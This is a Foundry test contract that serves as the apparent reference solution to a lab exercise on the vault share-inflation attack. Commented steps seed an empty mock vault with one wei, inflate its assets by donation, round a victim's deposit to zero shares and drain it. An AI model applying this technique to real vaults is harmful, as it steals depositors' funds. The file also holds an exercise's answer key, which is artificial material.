// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "../../shared/MockERC20.sol";
import {InflatableVault} from "../src/InflatableVault.sol";

/// Reference exploit for the first-deposit / share-inflation attack.
contract VaultInflationSolution is Test {
    MockERC20 token;
    InflatableVault vault;
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");
    uint256 constant VICTIM_DEPOSIT = 10_000e18;

    function setUp() public {
        token = new MockERC20("Asset", "AST");
        vault = new InflatableVault(token);
        token.mint(attacker, VICTIM_DEPOSIT + 1); // 1 wei to seed, the rest to donate
        token.mint(victim, VICTIM_DEPOSIT);
    }

    function test_exploit() public {
        uint256 attackerStart = token.balanceOf(attacker);

        // 1. Seed the empty vault with a single wei -> 1 share, 100% of supply.
        vm.startPrank(attacker);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(1);
        // 2. Donate directly to inflate totalAssets() while totalShares stays 1.
        token.transfer(address(vault), VICTIM_DEPOSIT);
        vm.stopPrank();

        // 3. Victim deposits -> shares = deposit * 1 / (1 + donation) rounds to 0.
        vm.startPrank(victim);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(VICTIM_DEPOSIT);
        vm.stopPrank();

        // 4. Attacker redeems the single share and drains the whole vault.
        vm.prank(attacker);
        vault.redeem(1);

        uint256 attackerEnd = token.balanceOf(attacker);
        assertGt(attackerEnd, attackerStart, "attacker should profit");
        assertEq(vault.shares(victim), 0, "victim's shares should round to zero");
        assertGe(attackerEnd - attackerStart, VICTIM_DEPOSIT - 1, "attacker should capture the victim's deposit");
    }
}
